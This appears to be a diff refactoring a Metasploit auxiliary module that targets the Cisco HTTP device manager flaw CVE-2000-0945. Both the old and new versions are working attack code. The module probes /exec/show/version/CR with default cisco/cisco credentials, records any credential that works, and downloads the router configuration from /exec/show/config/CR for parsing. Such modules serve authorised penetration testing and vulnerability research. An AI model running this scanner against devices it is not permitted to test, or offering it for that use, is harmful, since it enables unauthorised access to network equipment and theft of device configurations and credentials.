@@ -1,102 +1,102 @@
 ##
-# $Id$
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
+class MetasploitModule < Msf::Auxiliary
 
-require 'rex/proto/http'
-require 'msf/core'
+  # Exploit mixins should be called first
+  include Msf::Exploit::Remote::HttpClient
 
+  # Include Cisco utility methods
+  include Msf::Auxiliary::Cisco
 
+  # Scanner mixin should be near last
+  include Msf::Auxiliary::Scanner
 
-class Metasploit3 < Msf::Auxiliary
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Cisco Device HTTP Device Manager Access',
+        'Description' => %q{
+          This module gathers data from a Cisco device (router or switch) with the device manager
+          web interface exposed. The HttpUsername and HttpPassword options can be used to specify
+          authentication.
+        },
+        'Author'	=> [ 'hdm' ],
+        'License'	=> MSF_LICENSE,
+        'References' => [
+          [ 'BID', '1846'],
+          [ 'CVE', '2000-0945'],
+          [ 'OSVDB', '444'],
+        ],
+        'DisclosureDate' => '2000-10-26',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
+    register_options(
+      [
+        OptString.new('HttpUsername', [true, 'The HTTP username to specify for basic authentication', 'cisco']),
+        OptString.new('HttpPassword', [true, 'The HTTP password to specify for basic authentication', 'cisco'])
+      ]
+    )
+  end
 
-	# Exploit mixins should be called first
-	include Msf::Exploit::Remote::HttpClient
+  def run_host(ip)
+    res = send_request_cgi({
+      'uri' => "/exec/show/version/CR",
+      'method' => 'GET'
+    }, 20)
 
-	# Include Cisco utility methods
-	include Msf::Auxiliary::Cisco
+    if res and res.code == 401
+      print_error("#{rhost}:#{rport} Failed to authenticate to this device")
+      return
+    end
 
-	# Scanner mixin should be near last
-	include Msf::Auxiliary::Scanner
+    if res and res.code != 200
+      print_error("#{rhost}:#{rport} Unexpected response code from this device #{res.code}")
+      return
+    end
 
-	def initialize(info={})
-		super(update_info(info,
-			'Name'           => 'Cisco Device HTTP Device Manager Access',
-			'Description'    => %q{
-					This module gathers data from a Cisco device (router or switch) with the device manager
-				web interface exposed. The BasicAuthUser and BasicAuthPass options can be used to specify
-				authentication.
-			},
-			'Author'		=> [ 'hdm' ],
-			'License'		=> MSF_LICENSE,
-			'Version'		=> '$Revision$',
-			'References'	=>
-				[
-					[ 'BID', '1846'],
-					[ 'CVE', '2000-0945'],
-					[ 'OSVDB', '444'],
-				],
-			'DisclosureDate' => 'Oct 26 2000'))
-	end
+    if res and res.body and res.body =~ /Cisco (Internetwork Operating System|IOS) Software/
+      print_good("#{rhost}:#{rport} Successfully authenticated to this device")
+      store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])
 
-	def run_host(ip)
+      # Report a vulnerability only if no password was specified
+      if datastore['HttpPassword'].to_s.length == 0
 
-		res = send_request_cgi({
-			'uri'  		=>  "/exec/show/version/CR",
-			'method'   	=> 'GET'
-		}, 20)
+        report_vuln(
+          {
+            :host	=> rhost,
+            :port	=> rport,
+            :proto => 'tcp',
+            :name	=> self.name,
+            :info	=> "Module #{self.fullname} successfully accessed http://#{rhost}:#{rport}/exec/show/version/CR",
+            :refs => self.references,
+            :exploited_at => Time.now.utc
+          }
+        )
 
-		if res and res.code == 401
-			print_error("#{rhost}:#{rport} Failed to authenticate to this device")
-			return
-		end
+      end
 
-		if res and res.code != 200
-			print_error("#{rhost}:#{rport} Unexpected response code from this device #{res.code}")
-			return
-		end
+      res = send_request_cgi({
+        'uri' => "/exec/show/config/CR",
+        'method' => 'GET'
+      }, 20)
 
-		if res and res.body and res.body =~ /Cisco (Internetwork Operating System|IOS) Software/
-			print_good("#{rhost}:#{rport} Successfully authenticated to this device")
+      if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)/mi
+        config = $2.gsub(/<\/[A-Z].*/i, '').strip
+        print_good("#{rhost}:#{rport} Processing the configuration file...")
+        cisco_ios_config_eater(rhost, rport, config)
+      else
+        print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
+      end
 
-			# Report a vulnerability only if no password was specified
-			if datastore['BasicAuthPass'].to_s.length == 0
-
-				report_vuln(
-					{
-						:host	=> rhost,
-						:port	=> rport,
-						:proto  => 'tcp',
-						:name	=> self.name,
-						:info	=> "Module #{self.fullname} successfully accessed http://#{rhost}:#{rport}/exec/show/version/CR",
-						:refs   => self.references,
-						:exploited_at => Time.now.utc
-					}
-				)
-
-			end
-
-			res = send_request_cgi({
-				'uri'  		=>  "/exec/show/config/CR",
-				'method'   	=> 'GET'
-			}, 20)
-
-			if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)/mi
-				config = $2.gsub(/<\/[A-Z].*/i, '').strip
-				print_good("#{rhost}:#{rport} Processing the configuration file...")
-				cisco_ios_config_eater(rhost, rport, config)
-			else
-				print_error("#{rhost}:#{rport} Error: could not retrieve the IOS configuration")
-			end
-
-		end
-
-	end
-
+    end
+  end
 end
